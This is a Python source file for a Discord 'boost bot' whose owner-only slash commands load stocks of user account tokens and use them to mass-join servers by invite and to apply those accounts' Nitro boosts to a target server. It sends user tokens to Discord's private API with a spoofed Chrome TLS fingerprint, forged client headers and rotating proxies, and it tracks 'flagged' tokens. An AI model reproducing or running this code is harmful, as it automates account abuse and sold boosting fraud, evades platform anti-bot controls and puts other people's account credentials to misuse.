import discord
from discord.ext import commands
from discord import app_commands
import tls_client
import random
import sys
import time
import platform
import os
import hashlib
import string
import logging
import threading
import json
import httpx
import asyncio
from colorama import Fore, Style, init
from datetime import datetime
from pathlib import Path

# Initialize colorama
init()

# Configuration setup
config = {
    "token": "",
    "owner_id": "",
    "prefix": ".",
    "guild_id": "",
    "webhook_url": "",
    "proxyless": True
}

# Ensure directories exist
os.makedirs("input", exist_ok=True)
os.makedirs("logs", exist_ok=True)

# Initialize bot
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=config["prefix"], intents=intents, help_command=None)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format=f"{Fore.CYAN}%(asctime)s{Fore.RESET} {Fore.MAGENTA}%(levelname)s{Fore.RESET} {Fore.GREEN}%(message)s{Fore.RESET}",
    handlers=[
        logging.FileHandler("logs/bot.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Global variables
class State:
    active_tokens = []
    success_tokens = []
    failed_tokens = []
    boosts_done = 0
    joins_done = 0

# Helper functions
def timestamp():
    return f"{Fore.CYAN}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"

def get_all_tokens(filename: str):
    """Returns all tokens from a file"""
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        return []

def validate_invite(invite: str):
    """Validates a Discord invite"""
    try:
        response = httpx.get(f'https://discord.com/api/v10/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true')
        return 'type' in response.text
    except Exception:
        return False

def get_invite_code(invite_input: str):
    """Extracts invite code from various formats"""
    if "discord.gg/" in invite_input:
        return invite_input.split("discord.gg/")[1].split("/")[0]
    elif "discord.com/invite/" in invite_input:
        return invite_input.split("discord.com/invite/")[1].split("/")[0]
    elif "/invite/" in invite_input:
        return invite_input.split("/invite/")[1].split("/")[0]
    return invite_input

# Discord Joiner Class
class DiscordJoiner:
    def __init__(self):
        self.client = tls_client.Session(
            client_identifier="chrome112",
            random_tls_extension_order=True
        )
    
    def get_headers(self, token: str):
        return {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
        }
    
    def get_cookies(self):
        cookies = {}
        try:
            response = self.client.get('https://discord.com')
            for cookie in response.cookies:
                if cookie.name.startswith('__') and cookie.name.endswith('uid'):
                    cookies[cookie.name] = cookie.value
            return cookies
        except Exception as e:
            logger.error(f'Failed to obtain cookies: {e}')
            return cookies

    async def join_server(self, token: str, invite: str, proxy: str = None):
        """Joins a server using a token"""
        payload = {
            'session_id': ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
        }
        
        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        } if proxy else None

        try:
            response = self.client.post(
                url=f'https://discord.com/api/v9/invites/{invite}',
                headers=self.get_headers(token),
                json=payload,
                cookies=self.get_cookies(),
                proxy=proxy_dict
            )
            
            if response.status_code == 200:
                logger.info(f'Successfully joined server with token: {token[:15]}...')
                State.joins_done += 1
                State.success_tokens.append(token)
                return True
            elif response.status_code == 401:
                logger.error(f'Invalid token: {token[:15]}...')
                State.failed_tokens.append(token)
            elif response.status_code == 403:
                logger.warning(f'Flagged token (requires verification): {token[:15]}...')
                State.failed_tokens.append(token)
            else:
                logger.error(f'Failed to join server: {response.text}')
                State.failed_tokens.append(token)
        except Exception as e:
            logger.error(f'Error joining server: {e}')
            State.failed_tokens.append(token)
        
        return False

# Boosting functionality
async def boost_server(invite: str, token: str, months: int, proxy: str = None):
    """Boosts a server using a token"""
    joiner = DiscordJoiner()
    
    # First join the server
    joined = await joiner.join_server(token, invite, proxy)
    if not joined:
        return False
    
    # Then attempt to boost
    try:
        headers = joiner.get_headers(token)
        response = joiner.client.get(
            "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers=headers,
            proxy={"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        )
        
        if response.status_code == 200:
            boost_slots = response.json()
            if not boost_slots:
                logger.warning(f'No boost slots available for token: {token[:15]}...')
                return False
                
            # Get guild ID from the invite
            invite_info = joiner.client.get(
                f"https://discord.com/api/v9/invites/{invite}",
                headers=headers,
                proxy={"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
            ).json()
            
            guild_id = invite_info.get("guild", {}).get("id")
            if not guild_id:
                logger.error("Failed to get guild ID from invite")
                return False
                
            # Apply boosts
            for slot in boost_slots:
                payload = {"user_premium_guild_subscription_slot_ids": [slot["id"]]}
                boost_response = joiner.client.put(
                    f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
                    headers=headers,
                    json=payload,
                    proxy={"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                )
                
                if boost_response.status_code == 201:
                    logger.info(f'Successfully boosted server with token: {token[:15]}...')
                    State.boosts_done += 1
                    State.success_tokens.append(token)
                    return True
                else:
                    logger.error(f'Failed to boost server: {boost_response.text}')
        else:
            logger.error(f'Failed to get boost slots: {response.text}')
            
    except Exception as e:
        logger.error(f'Error boosting server: {e}')
    
    State.failed_tokens.append(token)
    return False

# Bot events
@bot.event
async def on_ready():
    logger.info(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    try:
        synced = await bot.tree.sync()
        logger.info(f"Synced {len(synced)} commands")
    except Exception as e:
        logger.error(f"Error syncing commands: {e}")
    
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=f"{config['prefix']}help"
    ))

# Help command (hybrid)
@bot.hybrid_command(name="help", description="Show all available commands")
async def help_command(ctx):
    """Displays a beautiful help menu"""
    embed = discord.Embed(
        title="🚀 Boost Bot Help",
        description="A professional Discord boosting and joining bot",
        color=0x5865F2
    )
    
    embed.add_field(
        name="🔹 Boosting Commands",
        value="""`/boost` - Boost a server""",
        inline=False
    )
    
    embed.add_field(
        name="🔹 Joining Commands",
        value="""`/join` - Join a server""",
        inline=False
    )
    
    embed.add_field(
        name="🔹 Token Management",
        value="""`/addtokens` - Add tokens to the bot
`/stock` - To see all available stock.""",
        inline=False
    )
    
    embed.set_footer(text=f"Requested by {ctx.author.display_name}", icon_url=ctx.author.avatar.url)
    embed.set_thumbnail(url=bot.user.avatar.url)
    
    await ctx.send(embed=embed)

# Boost command
@bot.tree.command(name="boost", description="Boost a server")
@app_commands.describe(
    invite="Server invite link",
    amount="Number of boosts (must be even)",
    months="Months to boost for",
    nickname="Nickname for booster accounts (optional)"
)
async def boost(
    interaction: discord.Interaction,
    invite: str,
    amount: int,
    months: int,
    nickname: str = None
):
    """Boosts a server with the specified amount of boosts"""
    if interaction.user.id != int(config["owner_id"]):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="Only the bot owner can use this command.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    if amount % 2 != 0:
        embed = discord.Embed(
            title="❌ Invalid Amount",
            description="Boost amount must be an even number.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    invite_code = get_invite_code(invite)
    if not validate_invite(invite_code):
        embed = discord.Embed(
            title="❌ Invalid Invite",
            description="The provided invite link is invalid.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # Check token stock
    token_file = f"input/{months}m_tokens.txt"
    tokens = get_all_tokens(token_file)
    required_tokens = amount // 2
    
    if len(tokens) < required_tokens:
        embed = discord.Embed(
            title="❌ Insufficient Tokens",
            description=f"You need at least {required_tokens} {months}-month tokens, but only have {len(tokens)}.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # Start boosting
    loading_embed = discord.Embed(
        title="⚡ Starting Boosts",
        description=f"Starting {amount} boosts for [discord.gg/{invite_code}](https://discord.gg/{invite_code})",
        color=discord.Color.blue()
    )
    loading_embed.add_field(name="Months", value=str(months))
    loading_embed.add_field(name="Nickname", value=nickname or "Not set")
    loading_embed.set_footer(text="This may take a few minutes...")
    
    await interaction.response.send_message(embed=loading_embed)
    
    # Reset state
    State.success_tokens = []
    State.failed_tokens = []
    State.boosts_done = 0
    
    # Load proxies if available
    proxies = get_all_tokens("input/proxies.txt")
    
    # Start boosting threads
    start_time = time.time()
    tasks = []
    for i in range(required_tokens):
        proxy = proxies[i % len(proxies)] if proxies and not config["proxyless"] else None
        task = asyncio.create_task(boost_server(invite_code, tokens[i], months, proxy))
        tasks.append(task)
    
    # Wait for all tasks to complete
    results = await asyncio.gather(*tasks)
    end_time = time.time()
    
    # Prepare results
    success = sum(results)
    failed = len(results) - success
    time_taken = round(end_time - start_time, 2)
    
    # Create results embed
    result_embed = discord.Embed(
        title="✅ Boosting Complete",
        color=discord.Color.green() if success > 0 else discord.Color.red()
    )
    result_embed.add_field(name="Server", value=f"[discord.gg/{invite_code}](https://discord.gg/{invite_code})", inline=False)
    result_embed.add_field(name="Boosts Attempted", value=str(amount))
    result_embed.add_field(name="Successful Boosts", value=str(success * 2))
    result_embed.add_field(name="Failed Boosts", value=str(failed * 2))
    result_embed.add_field(name="Time Taken", value=f"{time_taken} seconds")
    result_embed.set_footer(text=f"Boost Bot | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    await interaction.followup.send(embed=result_embed)
    
    # Save results to files
    with open(f"logs/success_{int(time.time())}.txt", "w") as f:
        f.write("\n".join(State.success_tokens))
    
    with open(f"logs/failed_{int(time.time())}.txt", "w") as f:
        f.write("\n".join(State.failed_tokens))

# Join command
@bot.tree.command(name="join", description="Join a server with tokens")
@app_commands.describe(
    invite="Server invite link"
)
async def join_server_command(
    interaction: discord.Interaction,
    invite: str
):
    """Joins a server using tokens"""
    if interaction.user.id != int(config["owner_id"]):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="Only the bot owner can use this command.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    invite_code = get_invite_code(invite)
    if not validate_invite(invite_code):
        embed = discord.Embed(
            title="❌ Invalid Invite",
            description="The provided invite link is invalid.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    tokens = get_all_tokens("input/tokens.txt")
    if not tokens:
        embed = discord.Embed(
            title="❌ No Tokens",
            description="No tokens found in input/tokens.txt",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # Start joining
    loading_embed = discord.Embed(
        title="⚡ Starting Joins",
        description=f"Joining [discord.gg/{invite_code}](https://discord.gg/{invite_code}) with {len(tokens)} tokens",
        color=discord.Color.blue()
    )
    loading_embed.set_footer(text="This may take a few minutes...")
    await interaction.response.send_message(embed=loading_embed)
    
    # Reset state
    State.success_tokens = []
    State.failed_tokens = []
    State.joins_done = 0
    
    # Load proxies if available
    proxies = get_all_tokens("input/proxies.txt")
    
    # Start joining threads
    start_time = time.time()
    tasks = []
    for i, token in enumerate(tokens):
        proxy = proxies[i % len(proxies)] if proxies and not config["proxyless"] else None
        task = asyncio.create_task(DiscordJoiner().join_server(token, invite_code, proxy))
        tasks.append(task)
    
    # Wait for all tasks to complete
    results = await asyncio.gather(*tasks)
    end_time = time.time()
    
    # Prepare results
    success = sum(results)
    failed = len(results) - success
    time_taken = round(end_time - start_time, 2)
    
    # Create results embed
    result_embed = discord.Embed(
        title="✅ Joining Complete",
        color=discord.Color.green() if success > 0 else discord.Color.red()
    )
    result_embed.add_field(name="Server", value=f"[discord.gg/{invite_code}](https://discord.gg/{invite_code})", inline=False)
    result_embed.add_field(name="Tokens Attempted", value=str(len(tokens)))
    result_embed.add_field(name="Successful Joins", value=str(success))
    result_embed.add_field(name="Failed Joins", value=str(failed))
    result_embed.add_field(name="Time Taken", value=f"{time_taken} seconds")
    result_embed.set_footer(text=f"Boost Bot | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    await interaction.followup.send(embed=result_embed)
    
    # Save results to files
    with open(f"logs/joins_success_{int(time.time())}.txt", "w") as f:
        f.write("\n".join(State.success_tokens))
    
    with open(f"logs/joins_failed_{int(time.time())}.txt", "w") as f:
        f.write("\n".join(State.failed_tokens))

# Stock command
@bot.tree.command(name="stock", description="Check token stock")
async def check_stock_command(interaction: discord.Interaction):
    """Displays the current token stock"""
    embed = discord.Embed(
        title="📊 Token Stock",
        color=0x5865F2
    )
    
    # 1 Month tokens
    one_month = get_all_tokens("input/1m_tokens.txt")
    embed.add_field(
        name="1 Month Tokens",
        value=f"{len(one_month)} tokens ({len(one_month) * 2} boosts)",
        inline=False
    )
    
    # 3 Month tokens
    three_month = get_all_tokens("input/3m_tokens.txt")
    embed.add_field(
        name="3 Month Tokens",
        value=f"{len(three_month)} tokens ({len(three_month) * 2} boosts)",
        inline=False
    )
    
    # Regular tokens
    regular_tokens = get_all_tokens("input/tokens.txt")
    embed.add_field(
        name="Regular Tokens",
        value=f"{len(regular_tokens)} tokens",
        inline=False
    )
    
    # Proxies
    proxies = get_all_tokens("input/proxies.txt")
    embed.add_field(
        name="Proxies",
        value=f"{len(proxies)} available" if proxies else "No proxies found",
        inline=False
    )
    
    embed.set_footer(text=f"Requested by {interaction.user.display_name}", icon_url=interaction.user.avatar.url)
    
    await interaction.response.send_message(embed=embed)

# Add tokens command
@bot.tree.command(name="addtokens", description="Add tokens to the bot")
@app_commands.describe(
    tokens="Tokens to add (separated by newlines)",
    token_type="Token type"
)
async def add_tokens_command(
    interaction: discord.Interaction,
    tokens: str,
    token_type: int
):
    """Adds tokens to the bot's storage"""
    if interaction.user.id != int(config["owner_id"]):
        embed = discord.Embed(
            title="❌ Access Denied",
            description="Only the bot owner can use this command.",
            color=discord.Color.red()
        )
        return await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # Determine file
    if token_type == 1:
        filename = "input/1m_tokens.txt"
    elif token_type == 3:
        filename = "input/3m_tokens.txt"
    else:
        filename = "input/tokens.txt"
    
    # Add tokens
    try:
        with open(filename, "a") as f:
            f.write("\n".join(tokens.splitlines()) + "\n")
        
        added_count = len(tokens.splitlines())
        embed = discord.Embed(
            title="✅ Tokens Added",
            description=f"Successfully added {added_count} tokens to {filename}",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error",
            description=f"Failed to add tokens: {str(e)}",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# Run the bot
if __name__ == "__main__":

    bot.run(config["token"])
